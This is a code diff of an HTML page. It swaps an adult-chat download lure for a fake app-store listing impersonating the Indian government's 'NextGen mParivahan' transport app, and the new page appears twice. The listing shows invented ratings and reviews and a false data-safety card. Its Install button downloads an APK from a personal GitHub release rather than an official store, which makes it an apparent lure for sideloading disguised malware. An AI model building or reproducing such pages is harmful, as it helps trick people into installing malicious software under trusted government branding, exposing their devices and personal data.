@@ -3,80 +3,394 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>SexyChat - Adult Chat</title>
+  <title>NextGen mParivahan</title>
   <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body, html { height: 100%; font-family: Arial, sans-serif; overflow-x: hidden; }
-
     body {
-      background: url("https://i.postimg.cc/nVkZ3wXm/bonnie-001-by-maisonette888-dk6gb96-414w.jpg") no-repeat center center/cover;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      overflow-x: hidden; /* Prevent horizontal scroll */
     }
-
-    body::before {
-      content: "";
-      position: fixed;
-      top: 0; left: 0; width: 100%; height: 100%;
-      background: inherit;
-      filter: blur(10px) brightness(0.5);
-      z-index: -1;
-    }
-
     .container {
-      display: flex; justify-content: center; align-items: center;
-      min-height: 100vh; padding: 20px;
+      max-width: 480px;
+      margin: auto;
+      padding: 20px;
     }
-
-    .card {
-      background: rgba(255,255,255,0.1); backdrop-filter: blur(10px);
-      border-radius: 20px; padding: 20px; max-width: 400px; width: 100%;
-      color: #fff; text-align: center; box-shadow: 0 10px 30px rgba(0,0,0,0.5);
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
     }
-
-    .card h1 { font-size: 28px; margin-bottom: 10px; }
-    .card p.tagline { font-size: 16px; margin-bottom: 20px; color: #ffdddd; }
-    .card img { width: 100%; border-radius: 15px; margin-bottom: 15px; }
-
-    .warning {
-      background: #8b0000; padding: 10px; border-radius: 10px; font-size: 14px; margin-bottom: 20px;
+    .header img {
+      width: 70px;
+      height: 70px;
+      border-radius: 15px;
     }
-
-    .features { text-align: left; margin-bottom: 20px; font-size: 14px; }
-    .features li { margin-bottom: 10px; }
-
-    .download-btn {
-      display: inline-block; padding: 15px 40px; font-size: 18px; font-weight: bold;
-      color: #fff; background: linear-gradient(45deg, #ff0000, #cc0000);
-      border: none; border-radius: 50px; cursor: pointer;
-      box-shadow: 0px 5px 15px rgba(0,0,0,0.3); text-decoration: none;
-      transition: transform 0.3s ease, background 0.3s ease;
+    .title {
+      flex-grow: 1;
     }
-
-    .download-btn:hover {
-      background: linear-gradient(45deg, #cc0000, #990000); transform: scale(1.05);
+    .title h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: bold;
     }
-
-    .footer { font-size: 10px; margin-top: 15px; color: #ccc; }
+    .title p {
+      margin: 2px 0;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .rating {
+      margin-top: 5px;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .install-btn {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background-color: #3ddc84;
+      color: black;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 20px 0;
+      text-decoration: none;
+    }
+    .screenshots {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+    .screenshots img {
+      height: 180px;
+      border-radius: 8px;
+    }
+    .section {
+      margin-top: 20px;
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 15px;
+    }
+    .section h3 {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #fff;
+    }
+    .section p {
+      font-size: 14px;
+      color: #bbb;
+    }
+    .section a {
+      color: #3ddc84;
+      font-size: 14px;
+      text-decoration: none;
+      margin-top: 10px;
+      display: inline-block;
+    }
+    .data-safety-card {
+      background-color: #1e1e1e;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 8px;
+    }
+    .data-safety-card p {
+      font-size: 14px;
+      color: #bbb;
+    }
+    /* Footer with icons */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background-color: #121212;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0;
+      border-top: 1px solid #333;
+    }
+    .footer div {
+      font-size: 14px;
+      color: #bbb;
+      text-align: center;
+      cursor: pointer;
+      transition: transform 0.2s ease-in-out;
+      padding: 8px;
+      border-radius: 8px;
+    }
+    .footer div:hover {
+      transform: scale(1.1);
+      background-color: #3ddc84;
+    }
+    .footer img {
+      width: 24px;
+      height: 24px;
+      margin-bottom: 5px;
+    }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="card">
-      <h1>SexyChat</h1>
-      <p class="tagline">The hottest adult chat experience</p>
-      <img src="https://i.postimg.cc/nVkZ3wXm/bonnie-001-by-maisonette888-dk6gb96-414w.jpg" alt="SexyChat Image">
-      <div class="warning">⚠️ Warning: This app contains adult content. You must be 18+ to download and use.</div>
-      <ul class="features">
-        <li>🔥 Private adult conversations</li>
-        <li>💋 5₹ for 5min vidoe call</li>
-        <li>🔞 18+ content only</li>
-        <li>📷 Nude video calls</li>
-      </ul>
-      <!-- Link points to latest.html redirect page -->
-      <a href="/latest.html" class="download-btn">Download Now</a>
-      <div class="footer">
-        By downloading this app, you agree to our Terms of Service and confirm you are 18+ years old.<br>
-        © 2023 SexyChat. All rights reserved.
+    <!-- Header -->
+    <div class="header">
+      <img src="https://i.postimg.cc/nL8T1qgC/IMG-20250827-155852-568.jpg" alt="App Logo">
+      <div class="title">
+        <h1>NextGen mParivahan</h1>
+        <p>National Informatics Centre</p>
+        <div class="rating">⭐ 3.8 · 682K reviews · Government</div>
       </div>
+    </div>
+
+    <!-- Install Button -->
+    <a class="install-btn" href="https://github.com/funk50161-lab/Last-app/releases/download/V1.0/M.parivahan.apk">
+      Install
+    </a>
+
+    <!-- Screenshots -->
+    <div class="screenshots">
+      <img src="https://i.postimg.cc/bvv9zL7D/Screenshot-2025-08-27-15-58-04-83-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s1">
+      <img src="https://i.postimg.cc/Vk2k6kTq/Screenshot-2025-08-27-15-58-11-19-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s2">
+      <img src="https://i.postimg.cc/9MK6PDdb/Screenshot-2025-08-27-15-58-15-39-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s3">
+      <img src="https://i.postimg.cc/90xqNjfL/Screenshot-2025-08-27-15-58-20-94-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s4">
+    </div>
+
+    <!-- About -->
+    <div class="section">
+      <h3>About this app</h3>
+      <p>Complete Transport Solution for Citizen</p>
+    </div>
+
+    <!-- Data Safety Card -->
+    <div class="data-safety-card">
+      <p><strong>No data shared with third parties</strong></p>
+      <p><strong>This app may collect these data types:</strong> Location, Personal info, and 5 others</p>
+      <p><strong>Data is encrypted in transit</strong></p>
+      <p><strong>Account deletion available</strong></p>
+      <a href="#">See details</a>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/game.png" alt="Games">
+      <div>Games</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/offer.png" alt="Offers">
+      <div>Offers</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/search.png" alt="Search">
+      <div>Search</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/apps.png" alt="Apps">
+      <div>Apps</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/book.png" alt="Books">
+      <div>Books</div>
+    </div>
+  </div>
+</body>
+</html><!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>NextGen mParivahan</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: Arial, sans-serif;
+      background-color: #121212;
+      color: #fff;
+      overflow-x: hidden; /* Prevent horizontal scroll */
+    }
+    .container {
+      max-width: 480px;
+      margin: auto;
+      padding: 20px;
+    }
+    .header {
+      display: flex;
+      align-items: center;
+      gap: 15px;
+    }
+    .header img {
+      width: 70px;
+      height: 70px;
+      border-radius: 15px;
+    }
+    .title {
+      flex-grow: 1;
+    }
+    .title h1 {
+      margin: 0;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .title p {
+      margin: 2px 0;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .rating {
+      margin-top: 5px;
+      font-size: 14px;
+      color: #bbb;
+    }
+    .install-btn {
+      display: block;
+      width: 100%;
+      text-align: center;
+      background-color: #3ddc84;
+      color: black;
+      padding: 12px;
+      border-radius: 8px;
+      font-size: 18px;
+      font-weight: bold;
+      margin: 20px 0;
+      text-decoration: none;
+    }
+    .screenshots {
+      display: flex;
+      gap: 10px;
+      overflow-x: auto;
+      margin: 15px 0;
+    }
+    .screenshots img {
+      height: 180px;
+      border-radius: 8px;
+    }
+    .section {
+      margin-top: 20px;
+      background-color: #1e1e1e;
+      border-radius: 8px;
+      padding: 15px;
+    }
+    .section h3 {
+      font-size: 16px;
+      margin-bottom: 10px;
+      color: #fff;
+    }
+    .section p {
+      font-size: 14px;
+      color: #bbb;
+    }
+    .section a {
+      color: #3ddc84;
+      font-size: 14px;
+      text-decoration: none;
+      margin-top: 10px;
+      display: inline-block;
+    }
+    .data-safety-card {
+      background-color: #1e1e1e;
+      padding: 15px;
+      margin-top: 20px;
+      border-radius: 8px;
+    }
+    .data-safety-card p {
+      font-size: 14px;
+      color: #bbb;
+    }
+    /* Footer with icons */
+    .footer {
+      position: fixed;
+      bottom: 0;
+      width: 100%;
+      background-color: #121212;
+      display: flex;
+      justify-content: space-around;
+      padding: 10px 0;
+      border-top: 1px solid #333;
+    }
+    .footer div {
+      font-size: 14px;
+      color: #bbb;
+      text-align: center;
+      cursor: pointer;
+      transition: transform 0.2s ease-in-out;
+      padding: 8px;
+      border-radius: 8px;
+    }
+    .footer div:hover {
+      transform: scale(1.1);
+      background-color: #3ddc84;
+    }
+    .footer img {
+      width: 24px;
+      height: 24px;
+      margin-bottom: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <!-- Header -->
+    <div class="header">
+      <img src="https://i.postimg.cc/nL8T1qgC/IMG-20250827-155852-568.jpg" alt="App Logo">
+      <div class="title">
+        <h1>NextGen mParivahan</h1>
+        <p>National Informatics Centre</p>
+        <div class="rating">⭐ 3.8 · 682K reviews · Government</div>
+      </div>
+    </div>
+
+    <!-- Install Button -->
+    <a class="install-btn" href="https://github.com/funk50161-lab/Last-app/releases/download/V1.0/M.parivahan.apk">
+      Install
+    </a>
+
+    <!-- Screenshots -->
+    <div class="screenshots">
+      <img src="https://i.postimg.cc/bvv9zL7D/Screenshot-2025-08-27-15-58-04-83-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s1">
+      <img src="https://i.postimg.cc/Vk2k6kTq/Screenshot-2025-08-27-15-58-11-19-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s2">
+      <img src="https://i.postimg.cc/9MK6PDdb/Screenshot-2025-08-27-15-58-15-39-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s3">
+      <img src="https://i.postimg.cc/90xqNjfL/Screenshot-2025-08-27-15-58-20-94-b5a5c5cb02ca09c784c5d88160e2ec24.jpg" alt="s4">
+    </div>
+
+    <!-- About -->
+    <div class="section">
+      <h3>About this app</h3>
+      <p>Complete Transport Solution for Citizen</p>
+    </div>
+
+    <!-- Data Safety Card -->
+    <div class="data-safety-card">
+      <p><strong>No data shared with third parties</strong></p>
+      <p><strong>This app may collect these data types:</strong> Location, Personal info, and 5 others</p>
+      <p><strong>Data is encrypted in transit</strong></p>
+      <p><strong>Account deletion available</strong></p>
+      <a href="#">See details</a>
+    </div>
+  </div>
+
+  <!-- Footer -->
+  <div class="footer">
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/game.png" alt="Games">
+      <div>Games</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/offer.png" alt="Offers">
+      <div>Offers</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/search.png" alt="Search">
+      <div>Search</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/apps.png" alt="Apps">
+      <div>Apps</div>
+    </div>
+    <div>
+      <img src="https://img.icons8.com/ios-filled/50/ffffff/book.png" alt="Books">
+      <div>Books</div>
     </div>
   </div>
 </body>
